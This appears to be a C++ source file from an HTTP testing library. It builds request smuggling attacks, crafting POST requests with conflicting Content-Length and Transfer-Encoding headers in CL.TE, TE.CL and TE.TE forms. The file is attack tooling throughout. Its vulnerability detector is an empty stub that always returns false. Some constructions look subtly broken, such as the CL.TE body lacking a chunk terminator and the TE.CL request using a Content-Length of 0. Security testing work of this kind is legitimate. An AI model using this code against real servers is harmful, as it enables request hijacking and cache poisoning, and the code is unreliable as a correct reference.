#include "haquests/http/smuggling.hpp"
#include <sstream>

namespace haquests {
namespace http {

Request Smuggling::createCLTE(const std::string& url,
                              const std::string& smuggled_request) {
    Request req("POST", url);
    
    // Add both Content-Length and Transfer-Encoding
    req.setHeader("Content-Length", std::to_string(smuggled_request.size()));
    req.setHeader("Transfer-Encoding", "chunked");
    
    // Set body as the smuggled request
    req.setBody(smuggled_request);
    
    return req;
}

Request Smuggling::createTECL(const std::string& url,
                              const std::string& smuggled_request) {
    Request req("POST", url);
    
    // Add Transfer-Encoding first, then Content-Length
    req.setHeader("Transfer-Encoding", "chunked");
    req.setHeader("Content-Length", "0");
    
    // Encode body as chunked
    std::ostringstream body;
    body << std::hex << smuggled_request.size() << "\r\n";
    body << smuggled_request << "\r\n";
    body << "0\r\n\r\n";
    
    req.setBody(body.str());
    
    return req;
}

Request Smuggling::createTETE(const std::string& url,
                              const std::string& smuggled_request) {
    Request req("POST", url);
    
    // Add obfuscated Transfer-Encoding headers
    req.setHeader("Transfer-Encoding", "chunked");
    req.addHeader("Transfer-Encoding", "identity");  // Note: May need custom header handling
    
    // Encode as chunked
    std::ostringstream body;
    body << std::hex << smuggled_request.size() << "\r\n";
    body << smuggled_request << "\r\n";
    body << "0\r\n\r\n";
    
    req.setBody(body.str());
    
    return req;
}

Request Smuggling::buildMalformed(const std::string& url,
                                  const std::string& content,
                                  SmugglingType type) {
    switch (type) {
        case SmugglingType::CL_TE:
            return createCLTE(url, content);
        case SmugglingType::TE_CL:
            return createTECL(url, content);
        case SmugglingType::TE_TE:
            return createTETE(url, content);
        default:
            return Request::POST(url, content);
    }
}

bool Smuggling::detectVulnerability(const std::string& /* url */,
                                    SmugglingType /* type */) {
    // TODO: Implement actual vulnerability detection
    // This would involve sending test requests and analyzing timing/responses
    return false;
}

} // namespace http
} // namespace haquests
